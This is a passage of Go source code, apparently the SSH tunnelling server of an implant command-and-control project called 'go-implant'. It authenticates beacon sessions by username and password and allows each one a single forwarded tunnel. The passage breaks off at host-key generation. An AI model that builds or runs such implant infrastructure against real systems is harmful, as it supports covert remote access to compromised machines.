
package ssh

import (
	"go-implant/client/config"
	"go-implant/common/communication"
	"go-implant/server/model"
	"crypto/rand"
	"crypto/rsa"
	"errors"
	"flag"
	"fmt"
	"io"
	"log"
	"net"
	"strconv"
	"strings"
	"sync"
	"time"

	"golang.org/x/crypto/ssh"
)

var (
	// 3h timeout
	maintimeout      = flag.Duration("main-timeout", time.Duration(180)*time.Minute, "Client socket timeout")
	forwardedtimeout = flag.Duration("forwarded-timeout", time.Duration(180)*time.Minute, "forwarded-tcpip timeout")
)

type tcpIPForwardPayload struct {
	Addr string
	Port uint32
}

type forwardedTCPPayload struct {
	Addr       string // Is connected to
	Port       uint32
	OriginAddr string
	OriginPort uint32
}

type tcpIPForwardCancelPayload struct {
	Addr string
	Port uint32
}

// Structure containing what address/port we should bind on, for forwarded-tcpip
// connections
type bindInfo struct {
	Bound string
	Port  uint32
	Addr  string
}

// ServeSSH starts new ssh server on localhost:port
// authentication is done with username:password
func ServeSSH(port int) error {

	// In the latest version of crypto/ssh (after Go 1.3), the SSH server type has been removed
	// in favour of an SSH connection type. A ssh.ServerConn is created by passing an existing
	// net.Conn and a ssh.ServerConfig to ssh.NewServerConn, in effect, upgrading the net.Conn
	// into an ssh.ServerConn

	sshconfig := &ssh.ServerConfig{
		//Define a function to run when a client attempts a password login
		PasswordCallback: func(c ssh.ConnMetadata, pass []byte) (*ssh.Permissions, error) {

			clients := model.Items()
			for k := range clients {
				if clients[k].Username != "" && clients[k].Username == c.User() && clients[k].Password != "" && clients[k].Password == string(pass) {
					// username:password pair found in db

					if clients[k].Forward != nil {
						// allow at most one tunnel for each client
						log.Printf("session %s is trying to open too many tunnels", clients[k].Beacon.UID)
						return nil, errors.New("Too many open tunnels")
					}

					return nil, nil
				}
			}

			return nil, fmt.Errorf("password rejected for %q", c.User())
		},

		// Allow at most one try per connection to slow down bruting
		MaxAuthTries: 1,
	}

	// generate ssh host key